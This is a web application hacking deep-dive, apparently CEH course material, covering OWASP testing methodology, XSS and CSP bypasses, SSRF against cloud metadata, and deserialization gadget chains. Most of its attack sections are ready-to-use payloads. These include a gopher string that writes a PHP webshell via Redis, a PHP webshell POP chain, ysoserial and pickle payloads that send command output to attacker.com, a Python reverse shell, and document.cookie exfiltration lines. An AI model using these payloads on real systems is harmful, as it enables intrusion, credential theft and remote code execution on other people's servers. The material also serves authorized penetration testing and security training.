# Web Application Hacking --- Deep Dive

> For authorized security testing, red team exercises, and educational study only.
> This document expands on the cheat sheet with in-depth methodology, advanced bypass
> techniques, and exploitation chains for web application security testing (CEH v13 Module 14).

## Prerequisites

- Solid understanding of HTTP/HTTPS, REST APIs, and web architecture
- Familiarity with at least one scripting language (Python, JavaScript, or PHP)
- Burp Suite Community/Pro or OWASP ZAP installed and configured
- Lab environment (DVWA, WebGoat, PortSwigger labs, or HackTheBox)
- Knowledge of HTML, JavaScript, SQL, and basic Linux commands
- Read the companion sheet: `sheets/offensive/web-app-hacking.md`

## 1. OWASP Testing Guide Methodology

The OWASP Web Security Testing Guide (WSTG) v4.2 provides a structured framework for
assessing web application security. It is divided into phases that map to the penetration
testing lifecycle.

### 1.1 Information Gathering (WSTG-INFO)

Passive and active reconnaissance to build a target profile.

```
WSTG-INFO-01  Conduct search engine discovery       Google dorks, Shodan, Censys
WSTG-INFO-02  Fingerprint web server                Server headers, error pages, default files
WSTG-INFO-03  Review webserver metafiles             robots.txt, sitemap.xml, security.txt
WSTG-INFO-04  Enumerate applications on server       Virtual hosts, subdomains, port scanning
WSTG-INFO-05  Review webpage content                 Comments, metadata, hidden fields
WSTG-INFO-06  Identify application entry points      Parameters, headers, cookies, file paths
WSTG-INFO-07  Map execution paths                    Application workflow, state transitions
WSTG-INFO-08  Fingerprint application framework      X-Powered-By, cookies, URL patterns
WSTG-INFO-09  Map application architecture           CDN, WAF, load balancer, backend services
WSTG-INFO-10  Map network architecture               DMZ, internal services, trust boundaries
```

**Key techniques for information gathering:**

```bash
# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak | ext:log

# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com

# Technology fingerprinting
whatweb http://target.com
wappalyzer (browser extension)
curl -sI http://target.com | grep -i "server\|x-powered-by\|x-aspnet"
```

### 1.2 Configuration and Deployment Testing (WSTG-CONF)

```
WSTG-CONF-01  Test network infrastructure config    Firewalls, load balancers, reverse proxies
WSTG-CONF-02  Test application platform config      Default settings, unnecessary features
WSTG-CONF-03  Test file extension handling           .php, .bak, .config, .old served as plaintext?
WSTG-CONF-04  Review backup/unreferenced files       .bak, .swp, ~, .git/, .svn/
WSTG-CONF-05  Enumerate infrastructure interfaces    Admin panels, management consoles
WSTG-CONF-06  Test HTTP methods                      OPTIONS, TRACE, PUT, DELETE enabled?
WSTG-CONF-07  Test HTTP Strict Transport Security    HSTS header presence and max-age
WSTG-CONF-08  Test RIA cross domain policy           crossdomain.xml, clientaccesspolicy.xml
WSTG-CONF-09  Test file permission                   World-readable config files, log files
WSTG-CONF-10  Test for subdomain takeover            Dangling DNS records, unclaimed services
WSTG-CONF-11  Test cloud storage                     Open S3 buckets, Azure blobs, GCS
```

### 1.3 Identity, Authentication, and Session Management

```
WSTG-IDNT-01  Test role definitions                  Admin, user, guest role separation
WSTG-IDNT-02  Test user registration process         Self-registration, email verification
WSTG-ATHN-01  Test credentials over encrypted channel  Login over HTTPS?
WSTG-ATHN-02  Test for default credentials           admin/admin, admin/password, guest/guest
WSTG-ATHN-03  Test for weak lockout mechanism        Brute force possible after N attempts?
WSTG-ATHN-04  Test for bypassing authentication      Direct page access, parameter modification
WSTG-ATHN-05  Test remember password functionality   Stored plaintext? Accessible via XSS?
WSTG-ATHN-06  Test for browser cache weakness        Autocomplete on password fields
WSTG-ATHN-07  Test for weak password policy          Min length, complexity, common passwords
WSTG-ATHN-08  Test for weak security questions        Guessable, public info answers
WSTG-ATHN-09  Test for password change/reset         Token predictability, no rate limiting
WSTG-SESS-01  Test session management schema         Cookie flags, session ID entropy
WSTG-SESS-02  Test for cookie attributes             Secure, HttpOnly, SameSite, Path
WSTG-SESS-03  Test for session fixation              Pre-set session ID accepted after login?
WSTG-SESS-04  Test for exposed session variables     Session ID in URL, referrer leakage
WSTG-SESS-05  Test for CSRF                          State-changing operations without tokens
WSTG-SESS-06  Test for logout functionality          Session invalidated server-side?
WSTG-SESS-07  Test session timeout                   Idle timeout, absolute timeout enforced?
WSTG-SESS-08  Test for session puzzling              Same session variable reused across flows
```

### 1.4 Input Validation Testing

This is the core of web application testing. Each test ID maps to a specific attack class.

```
WSTG-INPV-01  Reflected XSS                GET/POST parameter reflection
WSTG-INPV-02  Stored XSS                   Persistent in database/logs
WSTG-INPV-03  HTTP verb tampering           Change method to bypass controls
WSTG-INPV-04  HTTP parameter pollution      Duplicate parameters, server parsing differences
WSTG-INPV-05  SQL injection                 Union, blind, error-based, second-order
WSTG-INPV-06  LDAP injection               Search filter manipulation
WSTG-INPV-07  XML injection                Entity expansion, attribute injection
WSTG-INPV-08  SSI injection                Server-side includes
WSTG-INPV-09  XPath injection              XML database queries
WSTG-INPV-10  IMAP/SMTP injection          Email header injection
WSTG-INPV-11  Code injection               eval(), exec(), include() with user input
WSTG-INPV-12  Command injection            System calls with user-controlled data
WSTG-INPV-13  Format string injection      printf-style format specifiers
WSTG-INPV-14  Incubated vulnerability      Second-order injection, delayed execution
WSTG-INPV-15  HTTP splitting/smuggling     CL/TE desync, response splitting
WSTG-INPV-16  HTTP incoming requests        Server-side request validation
WSTG-INPV-17  Host header injection        Password reset poisoning, cache poisoning
WSTG-INPV-18  Server-side template injection  Jinja2, Twig, Freemarker RCE
WSTG-INPV-19  Server-side request forgery   SSRF to internal services and cloud metadata
```

### 1.5 Reporting

A professional web application penetration test report must include:

1. **Executive summary** -- business-level impact, no jargon
2. **Scope and methodology** -- what was tested, what was not, OWASP mapping
3. **Findings** -- each with severity (CVSS), description, evidence, remediation
4. **Risk rating** -- aggregate risk level with justification
5. **Remediation roadmap** -- prioritized by severity and effort

## 2. XSS Filter Bypass Techniques

When applications employ WAFs or custom filters, standard XSS payloads will be blocked.
These techniques circumvent common defenses.

### 2.1 Encoding Bypasses

```
HTML entity encoding:
  <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

URL encoding (double):
  %253Cscript%253Ealert(1)%253C%252Fscript%253E

Unicode escapes (JavaScript):
  <script>\u0061\u006C\u0065\u0072\u0074(1)</script>

Hex encoding in JS:
  <script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

Base64 in data URI:
  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>

Mixed case:
  <ScRiPt>alert(1)</sCrIpT>
```

### 2.2 Mutation XSS (mXSS)

Mutation XSS exploits differences between how HTML is parsed by sanitizers versus the
browser's actual DOM parser. The sanitizer sees safe HTML, but the browser mutates it
into executable JavaScript.

```html
<!-- Backtick mutation in older IE -->
<img src="x` `<script>alert(1)</script>"` `>

<!-- Namespace confusion -->
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>

<!-- DOMPurify bypass examples (version-specific) -->
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">

<!-- noscript parsing differential -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**Why mXSS works:** HTML sanitizers parse the input as an HTML fragment, but the
browser re-parses it in the context of the full document. Differences in how `<svg>`,
`<math>`, `<noscript>`, and `<template>` elements switch parsing modes create gaps
where the sanitizer's parse tree diverges from the browser's.

### 2.3 DOM Clobbering

DOM clobbering overwrites JavaScript variables and API references by creating HTML elements
with specific `id` or `name` attributes that collide with global object properties.

```html
<!-- Overwrite a variable used by the application -->
<!-- If JS code does: if (window.isAdmin) { ... } -->
<img id="isAdmin" src="x">
<!-- window.isAdmin now references the img element (truthy) -->

<!-- Overwrite a form reference -->
<!-- If JS code does: document.getElementById('config').value -->
<form id="config"><input name="value" value="attacker-controlled"></form>

<!-- Chain clobbering for nested properties -->
<!-- To clobber x.y: -->
<form id="x"><input name="y" value="clobbered"></form>
<!-- Now window.x.y === "clobbered" -->

<!-- Clobber document properties -->
<img name="cookie" src="x">
<!-- document.cookie now returns the img element, not cookies -->

<!-- Anchor-based clobbering for toString -->
<a id="config" href="javascript:alert(1)">
<!-- window.config.toString() returns "javascript:alert(1)" -->
```

**Defense:** Always use `let`/`const` declarations (not bare global variables), use
`document.getElementById()` with null checks, and avoid relying on global named access.

### 2.4 CSP Bypass Techniques

See section 5 for full CSP bypass coverage.

## 3. SSRF Advanced Exploitation

### 3.1 Cloud Metadata Services

Cloud metadata endpoints are the highest-value SSRF targets because they often expose
IAM credentials, API keys, and instance configuration.

```
AWS IMDSv1 (no authentication):
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  http://169.254.169.254/latest/user-data/

AWS IMDSv2 (requires token -- harder to exploit):
  Step 1: PUT http://169.254.169.254/latest/api/token
          Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
  Step 2: GET http://169.254.169.254/latest/meta-data/
          Header: X-aws-ec2-metadata-token: <token>
  Note: IMDSv2 requires a PUT with a custom header, which many SSRF
        vectors (img src, link href) cannot issue. Exploitable via
        full HTTP request control (curl-like SSRF).

GCP:
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Header required: Metadata-Flavor: Google
  Note: Header requirement blocks simple SSRF but not full-request SSRF.

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header required: Metadata: true

DigitalOcean:
  http://169.254.169.254/metadata/v1/
  http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

### 3.2 Internal Service Discovery

```bash
# Port scanning via SSRF
# Iterate over common ports on localhost and internal ranges:
http://127.0.0.1:22        # SSH banner
http://127.0.0.1:3306      # MySQL
http://127.0.0.1:5432      # PostgreSQL
http://127.0.0.1:6379      # Redis
http://127.0.0.1:8080      # Internal web service
http://127.0.0.1:9200      # Elasticsearch
http://127.0.0.1:27017     # MongoDB
http://127.0.0.1:11211     # Memcached

# Internal network scanning (common RFC 1918 ranges)
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Kubernetes-specific
http://10.96.0.1/           # Default cluster IP for kube-apiserver
https://kubernetes.default.svc/
http://127.0.0.1:10255/pods # Kubelet read-only API

# Docker-specific
http://127.0.0.1:2375/containers/json  # Docker API (unauthenticated)
http://127.0.0.1:2376/                 # Docker API (TLS)
```

### 3.3 Protocol Smuggling

SSRF is not limited to HTTP. Depending on the vulnerable library, other protocols may
be supported.

```
file:///etc/passwd                        # Local file read
gopher://127.0.0.1:6379/_SET%20key%20value  # Redis command injection
dict://127.0.0.1:6379/INFO                # Redis info via dict protocol
ftp://127.0.0.1/                          # FTP internal access
ldap://127.0.0.1/                         # LDAP query
```

**Gopher protocol for Redis RCE:**

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A
```

This writes a PHP webshell to `/var/www/html/shell.php` via Redis.

### 3.4 Blind SSRF

When the response is not reflected back to the attacker:

```
# Time-based detection
# Measure response time differences:
#   - Closed port: immediate connection refused
#   - Open port: may hang or return slowly
#   - Filtered port: timeout

# Out-of-band detection
# Use Burp Collaborator, interactsh, or your own DNS/HTTP server:
http://ATTACKER-ID.burpcollaborator.net
http://ATTACKER-ID.interact.sh

# DNS-based exfiltration
# If the SSRF follows redirects or resolves DNS:
http://data-exfil.attacker.com    # Check DNS logs for resolution

# Redirect-based exploitation
# Host a redirect on your server that points to internal resources:
# attacker.com/redirect -> 302 -> http://169.254.169.254/latest/meta-data/
```

### 3.5 SSRF Filter Bypass

```
# IP address alternative representations
127.0.0.1       -> 0x7f000001 (hex)
127.0.0.1       -> 2130706433 (decimal)
127.0.0.1       -> 0177.0.0.1 (octal)
127.0.0.1       -> 127.1 (short form)
127.0.0.1       -> 0 (Linux: 0 = 0.0.0.0 = localhost for some apps)

# IPv6
http://[::1]/
http://[0000::1]/
http://[::ffff:127.0.0.1]/

# DNS rebinding
# Register a domain that alternates between your IP and 127.0.0.1
# First resolution: your server (passes allowlist check)
# Second resolution: 127.0.0.1 (actual request hits internal)
# Tools: rbndr.us, singularity

# URL parsing inconsistencies
http://attacker.com@127.0.0.1/    # Userinfo component
http://127.0.0.1#@attacker.com/   # Fragment confusion
http://127.0.0.1%0d%0a@attacker.com/  # CRLF in URL
http://127.0.0.1:80\@attacker.com/    # Backslash parsing
```

## 4. Deserialization Gadget Chains

Insecure deserialization occurs when an application deserializes untrusted data without
validation, allowing attackers to manipulate object state or trigger code execution
through "gadget chains" -- sequences of existing class methods that chain together
to achieve a dangerous operation.

### 4.1 Java Deserialization

Java serialized objects begin with magic bytes `AC ED 00 05` (hex) or `rO0AB` (base64).

**Common gadget chain libraries:**

```
Commons Collections 3.x/4.x    InvokerTransformer, InstantiateTransformer
Commons BeanUtils              BeanComparator -> TemplatesImpl
Spring Framework               Spring AOP proxies, MethodInvokeTypeProvider
Groovy                         MethodClosure, ConvertedClosure
JDK (native)                   AnnotationInvocationHandler (JDK < 8u71)
```

**ysoserial usage:**

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/$(id|base64)' > payload.bin

# Common chains to try
java -jar ysoserial.jar CommonsCollections1 'COMMAND'
java -jar ysoserial.jar CommonsCollections5 'COMMAND'
java -jar ysoserial.jar CommonsCollections6 'COMMAND'
java -jar ysoserial.jar CommonsCollections7 'COMMAND'
java -jar ysoserial.jar CommonsCollections9 'COMMAND'
java -jar ysoserial.jar CommonsCollections10 'COMMAND'
java -jar ysoserial.jar Jdk7u21 'COMMAND'

# Detection: look for these in HTTP requests, cookies, or parameters
# Base64: rO0AB...
# Hex header: AC ED 00 05
# Content-Type: application/x-java-serialized-object
```

**How CommonsCollections1 works (simplified):**

```
AnnotationInvocationHandler.readObject()
  -> Map(Proxy).entrySet()
    -> AnnotationInvocationHandler.invoke()
      -> LazyMap.get()
        -> ChainedTransformer.transform()
          -> ConstantTransformer -> Runtime.class
          -> InvokerTransformer -> getMethod("getRuntime")
          -> InvokerTransformer -> invoke(null)
          -> InvokerTransformer -> exec("COMMAND")
```

### 4.2 PHP Deserialization

PHP deserialization targets `unserialize()` with user-controlled input. Exploitation
relies on "magic methods" that are automatically called during object lifecycle.

```
Magic methods triggered during deserialization:
  __wakeup()     Called when object is unserialized
  __destruct()   Called when object is garbage collected
  __toString()   Called when object is used as string
  __call()       Called when inaccessible method is invoked
```

**POP chain construction (Property-Oriented Programming):**

```php
// Target class with dangerous __destruct
class LogWriter {
    public $logFile;
    public $data;
    public function __destruct() {
        file_put_contents($this->logFile, $this->data);
    }
}

// Exploit: write a web shell
$exploit = new LogWriter();
$exploit->logFile = '/var/www/html/shell.php';
$exploit->data = '<?php system($_GET["cmd"]); ?>';
echo serialize($exploit);
// O:9:"LogWriter":2:{s:7:"logFile";s:25:"/var/www/html/shell.php";s:4:"data";s:29:"<?php system($_GET["cmd"]); ?>";}
```

**phpggc -- PHP gadget chain generator:**

```bash
phpggc -l                                    # list available chains
phpggc Laravel/RCE1 system id               # Laravel chain
phpggc Symfony/RCE4 system id               # Symfony chain
phpggc Monolog/RCE1 system id               # Monolog chain
phpggc -b Guzzle/RCE1 system id             # base64 output
```

### 4.3 Python Deserialization

Python `pickle` deserialization is inherently unsafe because the `__reduce__` method
allows arbitrary code execution during unpickling.

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(id|base64)',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())

# Alternative: using exec for more complex payloads
class ExecExploit:
    def __reduce__(self):
        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
```

**Detection indicators:**

```
# Python 2 pickle header: (dp0 or (lp0 or cos
# Python 3 pickle header: \x80\x04\x95 or \x80\x03
# Base64 of pickle often starts with: gASV

# YAML deserialization (PyYAML < 6.0 with yaml.load)
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]
```

### 4.4 .NET Deserialization

```
# Dangerous formatters:
BinaryFormatter                Always unsafe, no safe usage pattern
ObjectStateFormatter           Used in ViewState
SoapFormatter                  SOAP-based serialization
NetDataContractSerializer      WCF services
LosFormatter                   ASP.NET ViewState

# Detection:
# BinaryFormatter: starts with \x00\x01\x00\x00\x00
# ViewState: __VIEWSTATE parameter (base64)
# SOAP: XML with SOAP envelope

# ysoserial.net usage
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /c whoami"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd.exe /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd.exe /c whoami"

# ViewState deserialization (requires machine key)
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd.exe /c whoami" \
  --validationalg="SHA1" \
  --validationkey="KEY" \
  --generator="GENERATOR" \
  --viewstateuserkey="USERKEY" \
  --isdebug
```

## 5. Content Security Policy Bypass Techniques

Content Security Policy (CSP) is a browser security mechanism that restricts resource
loading via HTTP headers. Bypasses depend on the specific policy directives in use.

### 5.1 Understanding CSP Directives

```
default-src     Fallback for all fetch directives
script-src      Controls script execution
style-src       Controls CSS loading
img-src         Controls image loading
connect-src     Controls fetch/XHR/WebSocket
font-src        Controls font loading
object-src      Controls plugin loading (Flash, Java)
media-src       Controls audio/video loading
frame-src       Controls iframe sources
base-uri        Controls <base> element
form-action     Controls form submission targets
frame-ancestors Controls who can embed the page
report-uri      Where violation reports are sent
```

### 5.2 Bypasses for script-src 'self'

When only same-origin scripts are allowed:

```
# JSONP endpoints on same origin
<script src="/api/jsonp?callback=alert(1)//"></script>

# Angular/library on same origin (CSP unsafe-eval not needed for some versions)
# If AngularJS is loaded from same origin:
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">click</div>
</div>

# File upload + script-src 'self'
# Upload a JS file to the same origin, then reference it:
<script src="/uploads/evil.js"></script>

# Path traversal in script src
<script src="/uploads/..%2f..%2f..%2fetc/passwd"></script>

# Service worker registration (if scope permits)
navigator.serviceWorker.register('/uploads/sw.js')
```

### 5.3 Bypasses for script-src with nonce or hash

```
# Nonce reuse (server returns same nonce)
# If the nonce is static or predictable, inject a script with that nonce

# Base-uri injection (if base-uri not restricted)
<base href="https://attacker.com/">
<!-- Relative script paths now resolve to attacker's server -->

# Nonce exfiltration via CSS injection
# If style-src is loose, inject:
<style>
script[nonce^="a"] { background: url(https://attacker.com/leak?n=a) }
script[nonce^="b"] { background: url(https://attacker.com/leak?n=b) }
/* ... character-by-character nonce extraction */
</style>

# Script gadgets in frameworks
# Many frameworks have patterns that execute JS without explicit <script>:
# Polymer: <template is="dom-bind"><div on-click="alert">click</div></template>
# Vue.js: <div v-html="'<img src=x onerror=alert(1)>'"></div>
# Mavo: <div mv-expressions="{{ }}">{{self.alert(1)}}</div>
```

### 5.4 Bypasses for unsafe-inline without nonce

If `script-src 'unsafe-inline'` is present (common misconfiguration):

```html
<!-- Direct XSS works since inline scripts are allowed -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>

<!-- If unsafe-inline is paired with a nonce, unsafe-inline is IGNORED
     (nonce takes precedence in CSP Level 2+) -->
```

### 5.5 Bypasses Using Allowed Domains

```
# CDN-hosted libraries (if CDN domain is whitelisted)
# script-src cdn.jsdelivr.net
<script src="https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

# Google-hosted (if *.google.com or *.googleapis.com whitelisted)
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

# Common CSP bypass endpoints on whitelisted domains:
# - JSONP endpoints
# - Angular/Vue/React from CDN
# - Google Tag Manager
# - Facebook SDK
```

### 5.6 Data Exfiltration Despite CSP

Even with strict CSP, data can often be exfiltrated:

```
# DNS prefetch (connect-src does not block DNS)
<link rel="dns-prefetch" href="//DATA.attacker.com">

# Navigation (if form-action or default-src not restricted)
<meta http-equiv="refresh" content="0;url=https://attacker.com/?data=STOLEN">
window.location = 'https://attacker.com/?data=' + document.cookie;

# WebRTC (if connect-src doesn't block)
# STUN requests leak local IP and bypass some CSP configs

# Reporting endpoint abuse
# Intentionally trigger CSP violations that include sensitive data
# in the violation report sent to report-uri
```

### 5.7 CSP Analysis Tools

```bash
# Online evaluators
# https://csp-evaluator.withgoogle.com/
# Paste the CSP header to find weaknesses

# Browser DevTools
# Console shows CSP violations with details
# Network tab shows blocked requests

# curl to extract CSP
curl -sI http://target.com | grep -i content-security-policy
```
